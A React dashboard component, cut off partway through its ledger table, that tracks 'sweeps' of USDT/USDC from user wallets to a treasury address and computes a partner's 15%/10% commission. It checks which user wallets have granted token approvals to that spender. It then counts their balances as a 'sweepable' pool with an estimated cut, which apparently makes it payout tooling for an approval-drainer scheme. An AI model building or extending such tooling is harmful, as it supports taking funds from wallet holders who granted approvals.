'use client';

import React, { useState, useEffect, useMemo, useCallback } from 'react';
import {
  DollarSign,
  TrendingUp,
  ShieldCheck,
  CheckCircle2,
  Clock,
  ExternalLink,
  RefreshCw,
  Download,
  Calculator,
  Wallet,
  ArrowUpRight,
  Search,
  Copy,
  Check,
  Layers,
  Sparkles,
  AlertCircle,
} from 'lucide-react';
import { getFirebaseFirestore, ensureAnonymousAuth } from '@bspc/firebase';
import { collection, onSnapshot } from 'firebase/firestore';
import { collectionRecordRepository } from '../../repositories';

interface RevenueRecord {
  id: string;
  sender: string;
  recipient: string;
  token: string;
  amount: number;
  amountRawString: string;
  txHash: string;
  chain: string;
  status: 'confirmed' | 'pending' | 'failed';
  createdAt: string;
  blockNumber?: number;
  source: 'firestore' | 'onchain' | 'local';
}

interface AuthorizedWalletItem {
  uid: string;
  username: string;
  walletAddress: string;
  balanceUsdt: number;
  onChainBalance?: number | null;
  isApproved?: boolean | null;
  authorizationStatus: string;
}

type CalculationMode = 'per_tx' | 'total_volume' | 'progressive';

const THRESHOLD_AMOUNT = 20000; // $20,000 threshold
const RATE_UNDER_20K = 0.15;    // 15% for under $20k
const RATE_ABOVE_20K = 0.10;    // 10% for $20k and above

const DEFAULT_TREASURY = '0xd1dd9d76c3bf0162580a82b9b219e59d9ab61070';

function parseNumericAmount(val: unknown): number {
  if (typeof val === 'number') return isNaN(val) ? 0 : val;
  if (!val) return 0;
  const cleaned = String(val).replace(/[^0-9.-]/g, '');
  const parsed = parseFloat(cleaned);
  return isNaN(parsed) ? 0 : parsed;
}

/**
 * Calculates commission for a single amount based on the selected mode:
 * - 'per_tx': < $20,000 => 15%, >= $20,000 => 10%
 * - 'progressive': first $20,000 at 15%, amount above $20,000 at 10%
 */
function calculateSingleCommission(amount: number, mode: CalculationMode = 'per_tx'): {
  commission: number;
  effectiveRate: number;
  tierLabel: string;
} {
  if (amount <= 0) {
    return { commission: 0, effectiveRate: 0.15, tierLabel: '15% Tier (< $20k)' };
  }

  if (mode === 'progressive') {
    if (amount < THRESHOLD_AMOUNT) {
      return {
        commission: amount * RATE_UNDER_20K,
        effectiveRate: RATE_UNDER_20K,
        tierLabel: '15% Tier (< $20k)',
      };
    }
    const underPart = THRESHOLD_AMOUNT * RATE_UNDER_20K; // $3,000
    const overPart = (amount - THRESHOLD_AMOUNT) * RATE_ABOVE_20K;
    const totalComm = underPart + overPart;
    return {
      commission: totalComm,
      effectiveRate: totalComm / amount,
      tierLabel: 'Split (15% ≤20k / 10% >20k)',
    };
  }

  // Default: Flat tier based on whether amount is under $20k or >= $20k
  if (amount < THRESHOLD_AMOUNT) {
    return {
      commission: amount * RATE_UNDER_20K,
      effectiveRate: RATE_UNDER_20K,
      tierLabel: '15% Tier (< $20k)',
    };
  } else {
    return {
      commission: amount * RATE_ABOVE_20K,
      effectiveRate: RATE_ABOVE_20K,
      tierLabel: '10% Tier (≥ $20k)',
    };
  }
}

export default function PartnerRevenueDashboard() {
  const [records, setRecords] = useState<RevenueRecord[]>([]);
  const [authorizedWallets, setAuthorizedWallets] = useState<AuthorizedWalletItem[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [isScanningChain, setIsScanningChain] = useState(false);
  const [isScanningWallets, setIsScanningWallets] = useState(false);
  const [chainScanMsg, setChainScanMsg] = useState<string | null>(null);

  // Commission Calculation Mode
  const [calcMode, setCalcMode] = useState<CalculationMode>('per_tx');

  // Track which sweep IDs have already been paid out to the partner
  const [paidRecordIds, setPaidRecordIds] = useState<Record<string, boolean>>({});

  // Treasury / Spender address to verify on-chain
  const [watchedTreasury, setWatchedTreasury] = useState(DEFAULT_TREASURY);
  const [searchQuery, setSearchQuery] = useState('');
  const [statusFilter, setStatusFilter] = useState<'all' | 'confirmed' | 'unpaid' | 'paid'>('all');
  const [copiedText, setCopiedText] = useState<string | null>(null);

  // Quick Deal Calculator state
  const [calcInputAmount, setCalcInputAmount] = useState<string>('15000');

  // Load paid states from localStorage
  useEffect(() => {
    if (typeof window !== 'undefined') {
      try {
        const savedPaid = localStorage.getItem('bspc_partner_paid_records');
        if (savedPaid) setPaidRecordIds(JSON.parse(savedPaid));
        const savedTreasury = localStorage.getItem('bspc_partner_watched_treasury');
        if (savedTreasury) setWatchedTreasury(savedTreasury);
      } catch {}
    }
  }, []);

  const togglePaidStatus = (id: string) => {
    setPaidRecordIds((prev) => {
      const next = { ...prev, [id]: !prev[id] };
      try {
        localStorage.setItem('bspc_partner_paid_records', JSON.stringify(next));
      } catch {}
      return next;
    });
  };

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedText(text);
    setTimeout(() => setCopiedText(null), 1800);
  };

  // Load local custom sweeps if any were recorded in Admin
  const loadLocalRecords = (): RevenueRecord[] => {
    if (typeof window === 'undefined') return [];
    try {
      const raw = localStorage.getItem('bspc_admin_custom_collections');
      if (!raw) return [];
      const parsed = JSON.parse(raw);
      if (!Array.isArray(parsed)) return [];
      return parsed.map((r: any) => ({
        id: r.id || `local-${r.txHash}`,
        sender: r.sender || '0x...',
        recipient: r.recipient || DEFAULT_TREASURY,
        token: r.token || 'USDT',
        amount: parseNumericAmount(r.amount),
        amountRawString: String(r.amount || '0'),
        txHash: r.txHash || '0x...',
        chain: r.chain || 'Ethereum Mainnet',
        status: r.status || 'confirmed',
        createdAt: r.createdAt || new Date().toISOString(),
        blockNumber: r.blockNumber,
        source: 'local',
      }));
    } catch {
      return [];
    }
  };

  // Subscribe to Firestore collectionRecords & users
  useEffect(() => {
    setIsLoading(true);
    let unsubCollections = () => {};
    let unsubUsers = () => {};

    const initFirestore = async () => {
      try {
        await ensureAnonymousAuth();
        const db = getFirebaseFirestore();

        unsubCollections = onSnapshot(
          collection(db, 'collectionRecords'),
          (snap) => {
            const fsRecords: RevenueRecord[] = snap.docs.map((d) => {
              const data = d.data();
              const rawAmt = data.amountBaseUnits ?? data.amount ?? '0';
              return {
                id: d.id,
                sender: data.senderAddress || data.sender || '0x...',
                recipient: data.recipientAddress || data.recipient || DEFAULT_TREASURY,
                token: data.token || 'USDC',
                amount: parseNumericAmount(rawAmt),
                amountRawString: String(rawAmt),
                txHash: data.transactionHash || data.txHash || '0x...',
                chain: data.chainId === 11155111 || data.chain === 'Sepolia' ? 'Sepolia' : 'Ethereum Mainnet',
                status: (data.status as any) || 'confirmed',
                createdAt: data.createdAt?.toDate
                  ? data.createdAt.toDate().toISOString()
                  : data.createdAt || new Date().toISOString(),
                blockNumber: data.blockNumber,
                source: 'firestore',
              };
            });

            const local = loadLocalRecords();
            const mergedMap = new Map<string, RevenueRecord>();
            fsRecords.forEach((r) => mergedMap.set(r.txHash && r.txHash !== '0x...' ? r.txHash.toLowerCase() : r.id, r));
            local.forEach((r) => {
              const key = r.txHash && r.txHash !== '0x...' ? r.txHash.toLowerCase() : r.id;
              if (!mergedMap.has(key)) mergedMap.set(key, r);
            });

            setRecords(
              Array.from(mergedMap.values()).sort(
                (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
              )
            );
            setIsLoading(false);
          },
          () => {
            collectionRecordRepository
              .listRecords()
              .then((recs) => {
                const mapped: RevenueRecord[] = recs.map((r) => ({
                  id: r.recordId,
                  sender: r.senderAddress,
                  recipient: r.recipientAddress,
                  token: r.tokenAddress || 'USDC',
                  amount: parseNumericAmount(r.amountBaseUnits),
                  amountRawString: r.amountBaseUnits,
                  txHash: r.transactionHash,
                  chain: r.chainId === 11155111 ? 'Sepolia' : 'Ethereum Mainnet',
                  status: r.status as any,
                  createdAt: r.createdAt,
                  blockNumber: r.blockNumber,
                  source: 'firestore',
                }));
                setRecords(mapped);
              })
              .finally(() => setIsLoading(false));
          }
        );

        unsubUsers = onSnapshot(collection(db, 'users'), (snap) => {
          const seen = new Set<string>();
          const list: AuthorizedWalletItem[] = [];
          snap.docs.forEach((d) => {
            const data = d.data();
            const rawAddr = data.walletAddress || d.id;
            const clean = rawAddr.toLowerCase().replace(/^evm_/, '').replace(/^0x/, '');
            if (clean.length === 40) {
              if (seen.has(clean)) return;
              seen.add(clean);
            }
            const walletAddress = rawAddr.startsWith('0x') ? rawAddr : clean.length === 40 ? `0x${clean}` : rawAddr;
            if (!walletAddress.startsWith('0x') || walletAddress.length !== 42) return;

            list.push({
              uid: d.id,
              username: data.clientAlias || data.username || `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`,
              walletAddress,
              balanceUsdt: parseNumericAmount(data.balanceUsdt),
              authorizationStatus: data.authorizationStatus || 'none',
            });
          });
          setAuthorizedWallets(list);
        });
      } catch {
        setIsLoading(false);
      }
    };

    initFirestore();
    return () => {
      unsubCollections();
      unsubUsers();
    };
  }, []);

  // Scan Ethereum Blockchain directly for transfers to the Treasury address
  const handleScanBlockchain = useCallback(async () => {
    if (!watchedTreasury.startsWith('0x')) return;
    setIsScanningChain(true);
    setChainScanMsg(null);
    try {
      localStorage.setItem('bspc_partner_watched_treasury', watchedTreasury.trim());
      const res = await fetch(`/api/rpc/transfers?recipient=${encodeURIComponent(watchedTreasury.trim())}&chainId=1`);
      const data = await res.json();
      if (data.success && Array.isArray(data.transfers)) {
        setRecords((prev) => {
          const map = new Map<string, RevenueRecord>();
          prev.forEach((r) => {
            const key = r.txHash && r.txHash !== '0x...' ? r.txHash.toLowerCase() : r.id;
            map.set(key, r);
          });
          let added = 0;
          for (const t of data.transfers) {
            const key = t.txHash.toLowerCase();
            if (!map.has(key)) {
              added++;
              map.set(key, {
                id: t.id,
                sender: t.sender,
                recipient: t.recipient,
                token: t.token,
                amount: t.amount,
                amountRawString: t.amountFormatted,
                txHash: t.txHash,
                chain: t.chain,
                status: 'confirmed',
                createdAt: new Date().toISOString(),
                blockNumber: t.blockNumber,
                source: 'onchain',
              });
            }
          }
          setChainScanMsg(
            added > 0
              ? `Found ${added} new on-chain transfer(s) to treasury!`
              : `Blockchain verified up to block #${data.latestBlock}. All on-chain transfers match.`
          );
          return Array.from(map.values());
        });
      } else {
        setChainScanMsg(data.error || 'Could not query RPC logs.');
      }
    } catch (e: any) {
      setChainScanMsg(e?.message || 'On-chain scan error.');
    } finally {
      setIsScanningChain(false);
    }
  }, [watchedTreasury]);

  // Live On-Chain Balance Check for Authorized Wallets
  const handleInspectAuthorizedWallets = async () => {
    if (authorizedWallets.length === 0) return;
    setIsScanningWallets(true);
    try {
      const updated = await Promise.all(
        authorizedWallets.map(async (w) => {
          try {
            // Check USDC & USDT on Ethereum Mainnet
            const [usdtRes, usdcRes] = await Promise.all([
              fetch(
                `/api/rpc/inspect?target=${w.walletAddress}&token=0xdAC17F958D2ee523a2206206994597C13D831ec7&spender=${watchedTreasury}&chainId=1`
              ).then((r) => r.json()),
              fetch(
                `/api/rpc/inspect?target=${w.walletAddress}&token=0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48&spender=${watchedTreasury}&chainId=1`
              ).then((r) => r.json()),
            ]);

            const totalChainBal = (usdtRes.balance || 0) + (usdcRes.balance || 0);
            const approved = Boolean(usdtRes.isApproved || usdcRes.isApproved);
            return {
              ...w,
              onChainBalance: totalChainBal,
              isApproved: approved,
            };
          } catch {
            return w;
          }
        })
      );
      setAuthorizedWallets(updated);
    } finally {
      setIsScanningWallets(false);
    }
  };

  // Compute Revenue & Commission Totals
  const metrics = useMemo(() => {
    const confirmedRecords = records.filter((r) => r.status === 'confirmed');
    const totalRevenue = confirmedRecords.reduce((sum, r) => sum + r.amount, 0);

    let totalCommission = 0;
    let under20kVolume = 0;
    let under20kCommission = 0;
    let above20kVolume = 0;
    let above20kCommission = 0;
    let paidCommission = 0;
    let unpaidCommission = 0;

    if (calcMode === 'total_volume') {
      // Tier applied to total cumulative platform volume
      const isUnder = totalRevenue < THRESHOLD_AMOUNT;
      const rate = isUnder ? RATE_UNDER_20K : RATE_ABOVE_20K;
      totalCommission = totalRevenue * rate;

      if (isUnder) {
        under20kVolume = totalRevenue;
        under20kCommission = totalCommission;
      } else {
        above20kVolume = totalRevenue;
        above20kCommission = totalCommission;
      }

      confirmedRecords.forEach((r) => {
        const comm = r.amount * rate;
        if (paidRecordIds[r.id]) paidCommission += comm;
        else unpaidCommission += comm;
      });
    } else {
      // Per-transaction or Progressive bracket
      confirmedRecords.forEach((r) => {
        const { commission } = calculateSingleCommission(r.amount, calcMode);
        totalCommission += commission;

        if (r.amount < THRESHOLD_AMOUNT) {
          under20kVolume += r.amount;
          under20kCommission += commission;
        } else {
          above20kVolume += r.amount;
          above20kCommission += commission;
        }

        if (paidRecordIds[r.id]) {
          paidCommission += commission;
        } else {
          unpaidCommission += commission;
        }
      });
    }

    // Pending pipeline from authorized wallets
    const activeAuthWallets = authorizedWallets.filter(
      (w) => w.authorizationStatus === 'authorized' || w.isApproved
    );
    const pendingPipelineVolume = activeAuthWallets.reduce(
      (sum, w) => sum + (w.onChainBalance !== undefined && w.onChainBalance !== null ? w.onChainBalance : w.balanceUsdt),
      0
    );
    const pendingProjectedCommission = activeAuthWallets.reduce((sum, w) => {
      const bal = w.onChainBalance !== undefined && w.onChainBalance !== null ? w.onChainBalance : w.balanceUsdt;
      return sum + calculateSingleCommission(bal, calcMode).commission;
    }, 0);

    return {
      confirmedCount: confirmedRecords.length,
      totalRevenue,
      totalCommission,
      under20kVolume,
      under20kCommission,
      above20kVolume,
      above20kCommission,
      paidCommission,
      unpaidCommission,
      pendingPipelineVolume,
      pendingProjectedCommission,
      activeAuthWalletsCount: activeAuthWallets.length,
    };
  }, [records, calcMode, paidRecordIds, authorizedWallets]);

  // Filtered records for table
  const filteredRecords = useMemo(() => {
    return records.filter((r) => {
      const q = searchQuery.toLowerCase().trim();
      const matchesQuery =
        !q ||
        r.sender.toLowerCase().includes(q) ||
        r.recipient.toLowerCase().includes(q) ||
        r.txHash.toLowerCase().includes(q) ||
        r.token.toLowerCase().includes(q);

      if (!matchesQuery) return false;
      if (statusFilter === 'confirmed') return r.status === 'confirmed';
      if (statusFilter === 'paid') return r.status === 'confirmed' && Boolean(paidRecordIds[r.id]);
      if (statusFilter === 'unpaid') return r.status === 'confirmed' && !paidRecordIds[r.id];
      return true;
    });
  }, [records, searchQuery, statusFilter, paidRecordIds]);

  // Export CSV
  const handleExportCsv = () => {
    const headers = [
      'ID',
      'Date',
      'Sender Wallet',
      'Treasury Recipient',
      'Token',
      'Gross Amount ($)',
      'Applied Tier',
      'Your Commission ($)',
      'Settlement Status',
      'Transaction Hash',
    ];
    const rows = filteredRecords.map((r) => {
      const rateInfo =
        calcMode === 'total_volume'
          ? {
              commission: r.amount * (metrics.totalRevenue < THRESHOLD_AMOUNT ? RATE_UNDER_20K : RATE_ABOVE_20K),
              tierLabel: metrics.totalRevenue < THRESHOLD_AMOUNT ? '15% (< $20k)' : '10% (≥ $20k)',
            }
          : calculateSingleCommission(r.amount, calcMode);

      return [
        r.id,
        new Date(r.createdAt).toISOString(),
        r.sender,
        r.recipient,
        r.token,
        r.amount.toFixed(2),
        rateInfo.tierLabel,
        rateInfo.commission.toFixed(2),
        paidRecordIds[r.id] ? 'PAID' : 'UNPAID',
        r.txHash,
      ];
    });

    const csvContent =
      'data:text/csv;charset=utf-8,' +
      [headers.join(','), ...rows.map((e) => e.map((v) => `"${v}"`).join(','))].join('\n');
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `partner_commission_report_${new Date().toISOString().slice(0, 10)}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // Quick Calculator Preview
  const previewAmount = parseNumericAmount(calcInputAmount);
  const previewResult = calculateSingleCommission(previewAmount, calcMode);

  return (
    <div className="min-h-screen w-full bg-slate-950 text-slate-100 overflow-y-auto pb-20">
      {/* Top Header Bar */}
      <header className="sticky top-0 z-30 border-b border-slate-800/80 bg-slate-950/90 backdrop-blur-md px-6 py-4">
        <div className="max-w-7xl mx-auto flex flex-col md:flex-row md:items-center md:justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-emerald-400 to-teal-600 flex items-center justify-center text-slate-950 font-black shadow-lg shadow-emerald-500/20">
              <DollarSign className="w-6 h-6" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h1 className="text-lg font-extrabold tracking-tight text-white">
                  Partner Revenue & Commission Tracker
                </h1>
                <span className="px-2 py-0.5 text-[10px] font-bold uppercase tracking-wider rounded-full bg-emerald-500/15 text-emerald-400 border border-emerald-500/30">
                  15% &lt; $20k • 10% ≥ $20k
                </span>
              </div>
              <p className="text-xs text-slate-400">
                Real-time Firestore & Ethereum blockchain sweep monitor for independent commission settlement
              </p>
            </div>
          </div>

          {/* Calculation Mode Selector & Export */}
          <div className="flex flex-wrap items-center gap-2.5">
            <div className="flex items-center bg-slate-900 border border-slate-800 rounded-lg p-1 text-xs">
              <button
                onClick={() => setCalcMode('per_tx')}
                className={`px-2.5 py-1.5 rounded-md font-semibold transition-all ${
                  calcMode === 'per_tx'
                    ? 'bg-emerald-500 text-slate-950 shadow'
                    : 'text-slate-400 hover:text-white'
                }`}
                title="Each sweep under $20k gets 15%; each sweep $20k or above gets 10%"
              >
                Per-Sweep Tier
              </button>
              <button
                onClick={() => setCalcMode('progressive')}
                className={`px-2.5 py-1.5 rounded-md font-semibold transition-all ${
                  calcMode === 'progressive'
                    ? 'bg-emerald-500 text-slate-950 shadow'
                    : 'text-slate-400 hover:text-white'
                }`}
                title="First $20k of a sweep at 15%, anything above $20k at 10%"
              >
                Progressive Split
              </button>
              <button
                onClick={() => setCalcMode('total_volume')}
                className={`px-2.5 py-1.5 rounded-md font-semibold transition-all ${
                  calcMode === 'total_volume'
                    ? 'bg-emerald-500 text-slate-950 shadow'
                    : 'text-slate-400 hover:text-white'
                }`}
                title="Tier based on cumulative total revenue"
              >
                Total Volume Tier
              </button>
            </div>

            <button
              onClick={handleExportCsv}
              className="inline-flex items-center gap-1.5 px-3.5 py-2 rounded-lg text-xs font-bold bg-slate-800 hover:bg-slate-700 text-slate-100 border border-slate-700 transition-all cursor-pointer"
            >
              <Download className="w-3.5 h-3.5 text-emerald-400" />
              Export Statement CSV
            </button>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-6 pt-6 space-y-6">
        {/* Primary KPI Cards */}
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
          {/* 1. Total Platform Revenue */}
          <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 shadow-xl">
            <div className="flex items-center justify-between mb-3">
              <span className="text-xs font-bold uppercase tracking-wider text-slate-400">
                Total Platform Revenue
              </span>
              <div className="p-2 rounded-lg bg-blue-500/10 text-blue-400">
                <TrendingUp className="w-4 h-4" />
              </div>
            </div>
            <div className="text-2xl font-black text-white tracking-tight">
              ${metrics.totalRevenue.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
            </div>
            <div className="mt-2 flex items-center justify-between text-xs text-slate-400">
              <span>{metrics.confirmedCount} Confirmed Sweeps</span>
              <span className="text-blue-400 font-semibold">USDT / USDC</span>
            </div>
          </div>

          {/* 2. Your Total Commission Earned */}
          <div className="bg-gradient-to-br from-emerald-950/80 via-slate-900 to-slate-900 border border-emerald-500/30 rounded-2xl p-5 shadow-xl">
            <div className="flex items-center justify-between mb-3">
              <span className="text-xs font-bold uppercase tracking-wider text-emerald-400">
                Your Total Commission
              </span>
              <div className="p-2 rounded-lg bg-emerald-500/20 text-emerald-400">
                <DollarSign className="w-4 h-4" />
              </div>
            </div>
            <div className="text-2xl font-black text-emerald-400 tracking-tight">
              ${metrics.totalCommission.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
            </div>
            <div className="mt-2 flex items-center justify-between text-[11px] text-slate-300">
              <span>15% (&lt;$20k): ${metrics.under20kCommission.toLocaleString('en-US', { maximumFractionDigits: 0 })}</span>
              <span>10% (≥$20k): ${metrics.above20kCommission.toLocaleString('en-US', { maximumFractionDigits: 0 })}</span>
            </div>
          </div>

          {/* 3. Unpaid Commission Owed to You */}
          <div className="bg-slate-900/90 border border-amber-500/30 rounded-2xl p-5 shadow-xl">
            <div className="flex items-center justify-between mb-3">
              <span className="text-xs font-bold uppercase tracking-wider text-amber-400">
                Unpaid Balance Owed
              </span>
              <div className="p-2 rounded-lg bg-amber-500/15 text-amber-400">
                <Clock className="w-4 h-4" />
              </div>
            </div>
            <div className="text-2xl font-black text-amber-400 tracking-tight">
              ${metrics.unpaidCommission.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
            </div>
            <div className="mt-2 flex items-center justify-between text-xs text-slate-400">
              <span>Already Paid:</span>
              <span className="text-emerald-400 font-bold">
                ${metrics.paidCommission.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              </span>
            </div>
          </div>

          {/* 4. Pending Sweepable Pipeline */}
          <div className="bg-slate-900/90 border border-purple-500/30 rounded-2xl p-5 shadow-xl">
            <div className="flex items-center justify-between mb-3">
              <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
                Pending Authorized Pool
              </span>
              <div className="p-2 rounded-lg bg-purple-500/15 text-purple-400">
                <Wallet className="w-4 h-4" />
              </div>
            </div>
            <div className="text-2xl font-black text-white tracking-tight">
              ${metrics.pendingPipelineVolume.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
            </div>
            <div className="mt-2 flex items-center justify-between text-xs">
              <span className="text-slate-400">{metrics.activeAuthWalletsCount} Authorized Wallets</span>
              <span className="text-purple-400 font-bold">
                Est. Cut: ${metrics.pendingProjectedCommission.toLocaleString('en-US', { maximumFractionDigits: 2 })}
              </span>
            </div>
          </div>
        </div>

        {/* Tier Breakdown + Quick Calculator + On-Chain Verifier Row */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
          {/* Tier Breakdown Card */}
          <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 space-y-4">
            <div className="flex items-center justify-between">
              <h2 className="text-sm font-bold text-white flex items-center gap-2">
                <Layers className="w-4 h-4 text-emerald-400" />
                Commission Tier Breakdown
              </h2>
              <span className="text-[11px] text-slate-400">$20,000 Cutoff</span>
            </div>

            <div className="space-y-3">
              <div className="p-3.5 rounded-xl bg-slate-950/70 border border-slate-800/80 flex items-center justify-between">
                <div>
                  <div className="flex items-center gap-2">
                    <span className="px-2 py-0.5 text-[10px] font-extrabold rounded bg-emerald-500/20 text-emerald-400">
                      15% TIER
                    </span>
                    <span className="text-xs font-semibold text-slate-200">Under $20,000</span>
                  </div>
                  <div className="text-[11px] text-slate-400 mt-1">
                    Volume: ${metrics.under20kVolume.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-xs text-slate-400">Your 15% Cut</div>
                  <div className="text-base font-black text-emerald-400">
                    ${metrics.under20kCommission.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                  </div>
                </div>
              </div>

              <div className="p-3.5 rounded-xl bg-slate-950/70 border border-slate-800/80 flex items-center justify-between">
                <div>
                  <div className="flex items-center gap-2">
                    <span className="px-2 py-0.5 text-[10px] font-extrabold rounded bg-cyan-500/20 text-cyan-400">
                      10% TIER
                    </span>
                    <span className="text-xs font-semibold text-slate-200">$20,000 &amp; Above</span>
                  </div>
                  <div className="text-[11px] text-slate-400 mt-1">
                    Volume: ${metrics.above20kVolume.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-xs text-slate-400">Your 10% Cut</div>
                  <div className="text-base font-black text-cyan-400">
                    ${metrics.above20kCommission.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Quick Commission Calculator */}
          <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 space-y-4">
            <div className="flex items-center justify-between">
              <h2 className="text-sm font-bold text-white flex items-center gap-2">
                <Calculator className="w-4 h-4 text-amber-400" />
                Instant Payout Calculator
              </h2>
              <span className="text-[11px] text-slate-400">Test any amount</span>
            </div>

            <div>
              <label className="block text-[11px] font-semibold text-slate-400 mb-1.5">
                Platform Collection / Deal Amount (USD)
              </label>
              <div className="relative">
                <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400 font-bold">$</span>
                <input
                  type="text"
                  value={calcInputAmount}
                  onChange={(e) => setCalcInputAmount(e.target.value)}
                  placeholder="Enter amount (e.g. 15000 or 35000)"
                  className="w-full pl-8 pr-4 py-2.5 bg-slate-950 border border-slate-800 rounded-xl text-sm font-bold text-white focus:outline-none focus:border-emerald-500"
                />
              </div>
            </div>

            <div className="p-3.5 rounded-xl bg-emerald-500/10 border border-emerald-500/25 flex items-center justify-between">
              <div>
                <div className="text-[11px] text-emerald-300 font-semibold">{previewResult.tierLabel}</div>
                <div className="text-xs text-slate-400 mt-0.5">
                  Effective Rate: {(previewResult.effectiveRate * 100).toFixed(2)}%
                </div>
              </div>
              <div className="text-right">
                <div className="text-[11px] text-slate-300">Your Payout</div>
                <div className="text-xl font-black text-emerald-400">
                  ${previewResult.commission.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                </div>
              </div>
            </div>
          </div>

          {/* Tamper-Proof On-Chain Treasury Scanner */}
          <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 space-y-4">
            <div className="flex items-center justify-between">
              <h2 className="text-sm font-bold text-white flex items-center gap-2">
                <ShieldCheck className="w-4 h-4 text-teal-400" />
                Direct Blockchain Verification
              </h2>
              <a
                href={`https://etherscan.io/address/${watchedTreasury}#tokentxns`}
                target="_blank"
                rel="noopener noreferrer"
                className="inline-flex items-center gap-1 text-[11px] font-bold text-teal-400 hover:underline"
              >
                Etherscan <ExternalLink className="w-3 h-3" />
              </a>
            </div>

            <div>
              <label className="block text-[11px] font-semibold text-slate-400 mb-1.5">
                Watched Platform Treasury / Spender Address
              </label>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={watchedTreasury}
                  onChange={(e) => setWatchedTreasury(e.target.value)}
                  className="flex-1 px-3 py-2 bg-slate-950 border border-slate-800 rounded-xl text-xs font-mono text-slate-200 focus:outline-none focus:border-teal-500"
                />
                <button
                  onClick={handleScanBlockchain}
                  disabled={isScanningChain}
                  className="px-3.5 py-2 rounded-xl bg-teal-500 hover:bg-teal-400 disabled:opacity-50 text-slate-950 font-bold text-xs inline-flex items-center gap-1.5 shrink-0 cursor-pointer transition-all"
                >
                  <RefreshCw className={`w-3.5 h-3.5 ${isScanningChain ? 'animate-spin' : ''}`} />
                  {isScanningChain ? 'Scanning...' : 'Verify Chain'}
                </button>
              </div>
            </div>

            {chainScanMsg ? (
              <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 text-xs text-teal-300 flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-teal-400 shrink-0" />
                <span>{chainScanMsg}</span>
              </div>
            ) : (
              <p className="text-[11px] text-slate-400 leading-relaxed">
                Queries Ethereum Mainnet ERC-20 <code className="text-slate-200">Transfer</code> events directly so even unlogged sweeps to the treasury wallet are detected.
              </p>
            )}
          </div>
        </div>

        {/* All Platform Collections & Your Commission Ledger Table */}
        <div className="bg-slate-900/90 border border-slate-800 rounded-2xl shadow-xl overflow-hidden">
          <div className="p-5 border-b border-slate-800 flex flex-col md:flex-row md:items-center md:justify-between gap-4">
            <div>
              <h2 className="text-base font-extrabold text-white flex items-center gap-2">
                <Sparkles className="w-4 h-4 text-emerald-400" />
                Platform Sweeps &amp; Commission Ledger
              </h2>
              <p className="text-xs text-slate-400 mt-0.5">
                Every collection made by the platform and your exact 15% (&lt;$20k) or 10% (≥$20k) share. Click status to mark paid/unpaid.
              </p>
            </div>

            <div className="flex flex-wrap items-center gap-2.5">
              {/* Filter Pills */}
              <div className="flex items-center bg-slate-950 border border-slate-800 rounded-lg p-1 text-xs">
                {(['all', 'confirmed', 'unpaid', 'paid'] as const).map((tab) => (
                  <button
                    key={tab}
                    onClick={() => setStatusFilter(tab)}
                    className={`px-2.5 py-1 rounded-md font-semibold capitalize transition-all ${
                      statusFilter === tab
                        ? 'bg-slate-800 text-white'
                        : 'text-slate-400 hover:text-slate-200'
                    }`}
                  >
                    {tab}
                  </button>
                ))}
              </div>

              {/* Search Input */}
              <div className="relative">
                <Search className="w-3.5 h-3.5 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
                <input
                  type="text"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  placeholder="Search wallet or tx hash..."
                  className="pl-8 pr-3 py-1.5 bg-slate-950 border border-slate-800 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500"
                />
              </div>
            </div>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="border-b border-slate-800 bg-slate-950/60 text-[11px] font-bold uppercase tracking-wider text-slate-400">
                  <th className="py-3.5 px-4">Date / Source</th>
                  <th className="py-3.5 px-4">User Wallet (From)</th>
                  <th className="py-3.5 px-4">Token</th>
                  <th className="py-3.5 px-4 text-right">Platform Collected</th>
                  <th className="py-3.5 px-4 text-center">Applied Rate</th>
                  <th className="py-3.5 px-4 text-right">Your Commission</th>
                  <th className="py-3.5 px-4 text-center">On-Chain Proof</th>
                  <th className="py-3.5 px-4 text-right">Payout Settlement</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-800/60 text-xs">
                {isLoading ? (
                  <tr>
                    <td colSpan={8} className="py-12 text-center text-slate-400">
                      Loading live platform revenue records...
                    </td>
